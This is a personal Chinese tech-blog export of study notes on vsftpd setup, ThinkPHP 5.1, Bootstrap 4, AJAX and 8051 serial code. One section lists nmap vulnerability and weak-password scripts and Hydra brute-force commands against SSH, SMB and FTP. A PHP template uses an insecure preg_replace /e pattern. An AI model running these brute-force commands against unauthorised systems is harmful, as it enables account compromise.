<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/11.19/</url>
    <content><![CDATA[<h3 id="要点">要点</h3>
<ol type="1">
<li>看合同 查看滤波方法</li>
<li>使用库 ，有无滤波方法的实现库，对比rdl程序库和pdf文档</li>
<li></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>2018-寒假作业笔记</title>
    <url>/2018-%E5%AF%92%E5%81%87%E4%BD%9C%E4%B8%9A%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="寒假作业笔记">2018寒假作业笔记</h1>
<span id="more"></span>
<h5 id="ftp">ftp</h5>
<p><code>apt-get install vsftpd</code></p>
<p>ftp的配置文件主要有三个，位于/etc/vsftpd/目录下，分别是：</p>
<ul>
<li>ftpusers 该文件用来指定那些用户不能访问ftp服务器。</li>
<li>user_list 该文件用来指示的默认账户在默认情况下也不能访问ftp</li>
<li>vsftpd.conf vsftpd的主配置文件</li>
</ul>
<p>编辑vsftpd.conf <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen=YES</span><br><span class="line">//开启端口监听</span><br><span class="line">anonymous_enable=YES</span><br><span class="line">//允许匿名下载</span><br><span class="line">lcoal_enable=YES</span><br><span class="line">//允许本地用户登录</span><br><span class="line">anao_upload_enable=NO</span><br><span class="line">//禁止匿名用户上传</span><br><span class="line">local_umask=022</span><br><span class="line">//umask值</span><br></pre></td></tr></table></figure></p>
<h5 id="umask权限总结">umask权限总结</h5>
<p>文件省缺权限:666 文件夹省缺权限:777
umask的作用就是省缺权限减去umask每位的值得到新建文件的权限
例如默认umask为022 666-022=644 777-022=755</p>
<hr />
<h5 id="nmap弱口令爆破">nmap弱口令爆破</h5>
<ul>
<li><p>ftp
<code>nmap -p 21 -sV --script=ftp-anon -v x.x.x.x(ip)</code></p></li>
<li><p>mysql
<code>nmap -p 3306 --script mysql-empty-password.nse -v x.x.x.x(ip)</code>//空密码爆破,适用于批量
<code>nmap -p 3306 --script mysql-brute.nse -v x.x.x.x(ip)</code>//弱口令爆破</p></li>
<li><p>smb
<code>nmap -p 445 --script smb-vuln-ms17-010.nse x.x.x.x(ip)</code> &gt;
脚本集 &gt; smb-vuln-ms08-067.nse &gt; smb-vuln-ms10-054.nse &gt;
smb-vuln-ms10-061.nse &gt; smb-vuln-ms17-010.nse</p></li>
<li><h2 id="smtp-nmap--p-25---script-smtp-brute.nse--v-x.x.x.xip">smtp
<code>nmap -p 25 --script smtp-brute.nse -v x.x.x.x(ip)</code></h2>
<h5 id="hydra爆破">Hydra爆破</h5></li>
<li><p>ssh <code>hydra 127.0.0.2 ssh -l root -P pass.txt</code></p></li>
<li><p>smb
<code>hydra -l administrator -P pass.txt IP smb</code></p></li>
<li><p>ftp
<code>hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</code></p></li>
</ul>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>2018-寒假学习记录</title>
    <url>/2018-%E5%AF%92%E5%81%87%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="寒假学习记录">2018-寒假学习记录</h1>
<h3 id="假期学习了">假期学习了</h3>
<ul>
<li>Thinkphp5.1</li>
<li>Bootstrap4</li>
<li>jquery ajax</li>
<li>markdown</li>
</ul>
<h2 id="section"><span id="more"></span></h2>
<h4 id="便于爬虫识别的html标签">便于爬虫识别的html标签</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section定义 </span><br><span class="line">	用来区分各板块</span><br><span class="line">header main footer为方便爬虫检索</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table定义</span><br><span class="line"></span><br><span class="line">&lt;table border=&quot;1&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;th&gt;Month&lt;/th&gt;</span><br><span class="line">&lt;th&gt;Savings&lt;/th&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;January&lt;/td&gt;</span><br><span class="line">&lt;td&gt;$100&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">div 背景图片自适应显示</span><br><span class="line">	background-image: url(../imgs/footerkuang.png);</span><br><span class="line">    background-repeat: no-repeat;     //无重复</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    -moz-background-size: 100% 100%;</span><br><span class="line">	</span><br><span class="line">图片自适应div大小 </span><br><span class="line">	可重复</span><br><span class="line">	background-size:contain</span><br></pre></td></tr></table></figure>
<h4 id="thinkphp5.1">ThinkPhp5.1</h4>
<ol type="1">
<li>在linux下,需要权限php程序才能运行php文件,所以需要<code>chown apache2.apache2 /var/html/tp5/runtime -R</code>
递归修改tp5下的runtime目录</li>
<li>在linux下,使用文件上传,应该给tp5目录下的public/upload目录apapche用户权限,否则无法上传文件.</li>
<li>在linux下,需要额外安装php7.2-mysql,否则会产生无法访问数据库的错误.</li>
<li>linux配置php-fpm时,使用sock连接fpm时应该这么写</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        DocumentRoot &quot;/home/divint3/WWW/tp5/public&quot;                        </span><br><span class="line">        ServerName www.divint3.com            </span><br><span class="line">        ServerAlias divint3.com               </span><br><span class="line">        DirectoryIndex index.htm index.php index.html</span><br><span class="line">  &lt;Directory &quot;/home/divint3/WWW/tp5/public&quot;&gt;</span><br><span class="line">        Options FollowSymLinks ExecCGI //禁止访问目录,允许在该目录下执行CGI脚本</span><br><span class="line">        AllowOverride All //允许rewrite,根据htc</span><br><span class="line">        Order allow,deny //设置缺省的访问权限与Allow和Deny语句的处理顺序</span><br><span class="line">        Allow from all //允许从任何地址访问</span><br><span class="line">        Require all granted //允许所有请求访问资源</span><br><span class="line">        Satisfy all //禁止直接访问</span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line">        ProxyRequests Off</span><br><span class="line">        ProxyPassMatch ^/(.*\.php(/.*)?)$ unix:/run/php/php7.2-fpm.sock|fcgi://localhost/home/divint3/WWW/tp5/public/</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
<p>最后用phpinfo()验证是否开启php-fpm成功</p>
<ol start="5" type="1">
<li>linux下apache开启模块 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a2enmod rewrite </span><br><span class="line">a2enmod proxy</span><br><span class="line">a2enmod proxy_fcgi</span><br></pre></td></tr></table></figure></li>
<li>想要隐藏url的php文件名,应该编辑.<strong>htaccess</strong>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  //以上为默认配置文件</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]</span><br><span class="line">  //写的是rewrite规则,可以省略index.php文件访问</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure></li>
<li>本来要自己写分页操作的,没想到tp5自己有分页操作,语法 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bkList</span>(<span class="params"><span class="variable">$type</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$info</span>=<span class="title class_">Bkarticle</span>::<span class="title function_ invoke__">where</span>(<span class="string">&quot;type&quot;</span>,<span class="variable">$type</span>)-&gt;<span class="title function_ invoke__">paginate</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 获取分页显示</span></span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br><span class="line">    <span class="comment">// 模板变量赋值</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;info&#x27;</span>, <span class="variable">$info</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;page&#x27;</span>, <span class="variable">$page</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
Bkartical为数据库中的同名表.可用于查询数据库中的同名表.<code>paginate(10)</code>的意思是每页显示十条数据.
这是tp5中的模型操作数据库. <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;extend name=&quot;./common/father&quot; /&#125; //继承父模板</span><br><span class="line"></span><br><span class="line">&#123;block name=&quot;title&quot;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>灾害大百科<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name=&quot;content&quot;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;text-center table  table-bordered&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章标题<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>文章内容预览<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;volist name=&#x27;info&#x27; id=&#x27;bklist&#x27; length=&quot;50&quot;&#125;</span><br><span class="line">            &#123;php&#125;</span><br><span class="line">                $content=$bklist[&quot;content&quot;];</span><br><span class="line">                preg_replace(&#x27;/&lt;\s*img\s+[^&gt;]*?src\s*=\s*(\&#x27;|\&quot;)(.*?)\\1[^&gt;]*?\/?\s*&gt;/i&#x27;,&#x27;[图片]&#x27;,$content); //把数据库中取出的html文本数据中的匹配img标签的文本替换为[img],因为这这只是一个预览内容,不能把整个img文件链接地址暴露出来</span><br><span class="line">                preg_replace(&#x27;/(&lt;/?)(w+)([^&gt;]*&gt;)/e&#x27;, &quot;&#x27;\1&#x27;.strtoupper(&#x27;\2&#x27;).&#x27;\3&#x27;&quot;, $content); //替换掉所有标签,只保留文本内容</span><br><span class="line">                $content=substr($content,0,100); //截取100的长度</span><br><span class="line">            &#123;/php&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/bkarticle/&#123;$bklist.id&#125;&quot;</span>&gt;</span>&#123;$bklist.title&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;text-left&quot;</span>&gt;</span>&#123;php&#125;echo $content;&#123;/php&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;/volist&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;float-right&quot;</span>&gt;</span>&#123;$info|raw&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span> //这里输出分页表</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;/block&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name=&quot;js&quot;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/baike/bklist.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br></pre></td></tr></table></figure>
使用jquery为对象添加class,因为{$info|raw}输出的是一个html代码,而这个代码不法修改,只能用jquery确定元素,增加class
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(function () &#123;</span><br><span class="line">    $(&quot;main section div div ul li&quot;).addClass(&quot;page-item&quot;);</span><br><span class="line">    $(&quot;main section div div ul span&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">    $(&quot;main section div div ul li a&quot;).addClass(&quot;page-link&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure> 分页效果如下 <img src="/images/loading.gif" data-original="/uploads/fzcms.png" /></li>
<li>phpstrom在linux下有个东西不知道怎么取消,反正就是根据是否使用git提交文件的颜色会有变化,其实只要Alt+F12
用git同步就行了,一个add,一个comment颜色就没啦,这种颜色不一样保持了我这个强迫症不断备份啊.红色是未提交,绿色是新添加,蓝色是已修改</li>
</ol>
<p>9.PHP版本过高会使tp5无法连接数据库,在尝试数据库迁移时,会报错<code>SQLSTATE[HY000] [2054] The server requested authentication method unknown to the client</code>发生这种错误，是由于MySQL
8默认使用了新的密码验证插件：caching_sha2_password，而之前的PHP版本中所带的mysqlnd无法支持这种验证。</p>
<p>修改 /etc/mysql/my.cnf，添加下面一行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">default_authentication_plugin= mysql_native_password</span><br></pre></td></tr></table></figure> 然后重置密码：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;user&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;password&#x27;;</span><br></pre></td></tr></table></figure> ---</p>
<h4 id="简单的ajax.post">简单的ajax.post</h4>
<ol type="1">
<li>首先说说a标签如何触发onclick事件</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;js_method()&quot;</span>&gt;</span>Some Thing<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里herf超链接指向了一个空的js脚本,然后定义onclick事件
这样,我们可以使用a标签使用onclick事件发送一个ajax请求 定义一个类
叫做upload,创建一个方法,用来接收数据,这里在js处理完数据后,php仍然会检验数据可用性,我把它定义在了<strong>admin/bkadd/addcheck</strong>下,
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 前端文章上传类</span></span><br><span class="line"><span class="comment">* @author Divint3</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> upload = &#123;</span><br><span class="line">    <span class="attr">check</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> type = $(<span class="string">&#x27;input[name=&quot;type&quot;]:checked&#x27;</span>).<span class="title function_">val</span>();</span><br><span class="line">        <span class="keyword">var</span> title = $(<span class="string">&#x27;input[name=&quot;title&quot;]&#x27;</span>).<span class="title function_">val</span>();</span><br><span class="line">        <span class="keyword">var</span> content = editor.<span class="property">txt</span>.<span class="title function_">html</span>();<span class="comment">//获取各种值并定义变量</span></span><br><span class="line">        <span class="keyword">if</span> (content == <span class="string">&quot;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.<span class="title function_">error</span>(<span class="string">&quot;内容不能为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!title) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.<span class="title function_">error</span>(<span class="string">&quot;标题不能为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!type) &#123;</span><br><span class="line">            <span class="keyword">return</span> dialog.<span class="title function_">error</span>(<span class="string">&quot;未指定文章类型&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&quot;admin/bkadd/addcheck&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: type,</span><br><span class="line">            <span class="string">&quot;title&quot;</span>: title,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: content,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        $.<span class="title function_">post</span>(url, data, <span class="keyword">function</span> (<span class="params">result</span>) &#123;<span class="comment">//result是admin/bkadd/addcheck返回的json数据</span></span><br><span class="line">            <span class="keyword">if</span> (result.<span class="property">status</span>) &#123;<span class="comment">//status返回的是php检验数据是否成功,检验数据成功后,tp5助手函数db会返回一个非零数值,如果插入失败,返回零</span></span><br><span class="line">                dialog.<span class="title function_">success</span>(result.<span class="property">message</span>);<span class="comment">//dialog封装了layer弹出层的方法,方便调用</span></span><br><span class="line">                editor.<span class="property">txt</span>.<span class="title function_">html</span>(<span class="string">&#x27;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&#x27;</span>);</span><br><span class="line">                $(<span class="string">&#x27;input[name=&quot;title&quot;]&#x27;</span>).<span class="title function_">val</span>(<span class="string">&quot;&quot;</span>);<span class="comment">//数据信息清空</span></span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                dialog.<span class="title function_">error</span>(result.<span class="property">message</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;JSON&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>PHP检验代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addCheck</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//这里接收ajax请求,处理请求</span></span><br><span class="line">        <span class="variable">$type</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="variable">$title</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">show</span>(<span class="number">0</span>, <span class="string">&#x27;未指定文章类型&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$title</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">show</span>(<span class="number">0</span>, <span class="string">&#x27;标题不能为空&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$content</span> == <span class="string">&quot;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">show</span>(<span class="number">0</span>, <span class="string">&#x27;内容不能为空&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = [</span><br><span class="line">            <span class="string">&quot;type&quot;</span> =&gt; <span class="variable">$type</span>,</span><br><span class="line">            <span class="string">&quot;title&quot;</span> =&gt; <span class="variable">$title</span>,</span><br><span class="line">            <span class="string">&quot;content&quot;</span> =&gt; <span class="variable">$content</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$isset</span> = <span class="title class_">Bkarticle</span>::<span class="title function_ invoke__">where</span>(<span class="string">&quot;title&quot;</span>, <span class="variable">$title</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$isset</span> == <span class="keyword">array</span>()) &#123;</span><br><span class="line">            <span class="variable">$s</span> = <span class="title function_ invoke__">db</span>(<span class="string">&quot;bkarticle&quot;</span>)-&gt;<span class="title function_ invoke__">data</span>(<span class="variable">$data</span>)-&gt;<span class="title function_ invoke__">insert</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">show</span>(<span class="variable">$s</span>, <span class="string">&quot;插入百科文章成功&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;type&quot;</span> =&gt; <span class="variable">$type</span>,</span><br><span class="line">                <span class="string">&quot;content&quot;</span> =&gt; <span class="variable">$content</span>,</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">show</span>(<span class="number">0</span>, <span class="string">&quot;这个文章名已经被用过了&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的show方法我定义在了application下的comment.php下,因为这里是公共方法,所有方法都可以引用
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$status</span>, <span class="variable">$message</span>, <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=[</span><br><span class="line">        <span class="string">&#x27;status&#x27;</span>=&gt;<span class="variable">$status</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>=&gt;<span class="variable">$message</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">exit</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">&#125;<span class="comment">//就是返回了一个json,给使用ajax.post方法的一个result,这样js才能处理插入状态</span></span><br></pre></td></tr></table></figure></p>
<hr />
<h4 id="bootstrap4">bootstrap4</h4>
<ol type="1">
<li>使用bs4的原因是他的排版和配色真的好看,给大家一个bs4主题链接https://bootswatch.com/
,配色什么的方案多样.</li>
<li>bs4的栅格结构也很好,支持动态响应.反正我现阶段是写不出来.</li>
<li>bs4没啥好说的,就是个css加js,调用就完事了. 常用知识点
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">容器</span><br><span class="line">	container 类用于固定宽度并支持响应式布局的容器。</span><br><span class="line">	container-fluid 类用于 100% 宽度，占据全部视口（viewport）的容器</span><br><span class="line">颜色操作 bg-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">	</span><br><span class="line">前景色 text-</span><br><span class="line"></span><br><span class="line">字体位置</span><br><span class="line">	text-center/left/right</span><br><span class="line">	font-weight-normal 普通</span><br><span class="line">				-bold 加粗</span><br><span class="line">英文变换</span><br><span class="line">	text-lowercase 小写</span><br><span class="line">		-uppercase 大写</span><br><span class="line">		-capitalize 自动大小写</span><br><span class="line">字体大小 display-</span><br><span class="line">	display-1 最大</span><br><span class="line">			-2</span><br><span class="line">			-3</span><br><span class="line">			-4 最小</span><br><span class="line"></span><br><span class="line">网格系统 col-</span><br><span class="line">	一共划分为12个网格</span><br><span class="line">	.col- 针对极小屏幕</span><br><span class="line">	.col-sm- 平板 - 屏幕宽度等于或大于 576px</span><br><span class="line">	.col-md- 桌面显示器 - 屏幕宽度等于或大于 768px)</span><br><span class="line">	.col-lg- 大桌面显示器 - 屏幕宽度等于或大于 992px)</span><br><span class="line">	.col-xl- 超大桌面显示器 - 屏幕宽度等于或大于 1200px)</span><br><span class="line">	</span><br><span class="line">	xl与lg同时存在,若大于xl判定,使用xl规则,大于lg小于xl,使用lg规则,以此类推</span><br><span class="line">	只定义了col-md 那么md及md以上使用md的规则,md以下使用默认规则</span><br><span class="line">	</span><br><span class="line">	offset-</span><br><span class="line">		偏移系统,指定偏移多少单位,最高12</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">余白与边框 </span><br><span class="line">	padding 余白</span><br><span class="line">	margin 边框</span><br><span class="line">	写法</span><br><span class="line">		p/m&#123;location=t[op]b[lod]l[eft]r[ight]xy&#125;-size</span><br><span class="line">		x代表上下</span><br><span class="line">		y代表左右</span><br><span class="line">	size定义值</span><br><span class="line">		1 0.25rem</span><br><span class="line">		2 0.5rem</span><br><span class="line">		3 1rem</span><br><span class="line">		4 1.5rem</span><br><span class="line">		5 3rem</span><br><span class="line">	maigin在class中定义</span><br><span class="line">		margin-tblr:#px %</span><br><span class="line">	        &#123;margin-left: auto;</span><br><span class="line">            margin-right: auto;&#125;代表水平居中</span><br><span class="line">			</span><br><span class="line">按钮定义 btn-</span><br><span class="line">	primary</span><br><span class="line">	secondary</span><br><span class="line">	success</span><br><span class="line">	waring</span><br><span class="line">	light(高亮)</span><br><span class="line">定义行 row</span><br><span class="line">显示顺序 order	</span><br><span class="line">	order-屏幕尺寸-顺序值</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<hr />
<h4 id="layer弹出层">layer弹出层</h4>
<p>这就是个充数的,调用看官网就行了.</p>
<hr />
<h4 id="markdown">MarkDown</h4>
<p>同上</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>51例程</title>
    <url>/51%E4%BE%8B%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="背景知识">背景知识</h2>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/1349775725_4675.png" />
### 文件下载 <a href="/51%E4%BE%8B%E7%A8%8B/51%E5%8D%95%E7%89%87%E6%9C%BA%E7%89%B9%E6%AE%8A%E5%8A%9F%E8%83%BD%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E4%B8%B2%E8%A1%8C%E9%80%9A%E8%AE%AF.pdf" title="51单片机特殊功能寄存器与串行通讯文件下载">51单片机特殊功能寄存器与串行通讯文件下载</a> <span id="more"></span></p>
<h4 id="代码示例">代码示例</h4>
<h5 id="串口输出转lcd显示中断方式">串口输出转lcd显示,中断方式</h5>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;reg51.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrins.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uchar unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uint unsigned int</span></span><br><span class="line"></span><br><span class="line">uchar code sendBuf[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,<span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,<span class="number">0x7f</span>,<span class="number">0x6f</span>&#125;; </span><br><span class="line">uchar flag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay</span><span class="params">(uchar)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	EA=<span class="number">1</span>;</span><br><span class="line">	ES=<span class="number">1</span>;</span><br><span class="line">	SCON=<span class="number">0x00</span>;</span><br><span class="line">	</span><br><span class="line">	SBUF=sendBuf[flag];</span><br><span class="line">	<span class="keyword">for</span>(;;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sint</span><span class="params">()</span> interrupt 4&#123;</span><br><span class="line">	delay(<span class="number">500</span>);</span><br><span class="line">	</span><br><span class="line">	SBUF=sendBuf[flag];</span><br><span class="line">	flag++;</span><br><span class="line">	<span class="keyword">if</span>(flag==<span class="number">10</span>)&#123;</span><br><span class="line">		flag=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	TI=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delay</span><span class="params">(uchar ms)</span>&#123;</span><br><span class="line">	uchar i;</span><br><span class="line">	<span class="keyword">while</span>(ms)&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">123</span>;i++);</span><br><span class="line">		ms--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="读取按键转lcd字符显示">读取按键转lcd字符显示</h5>
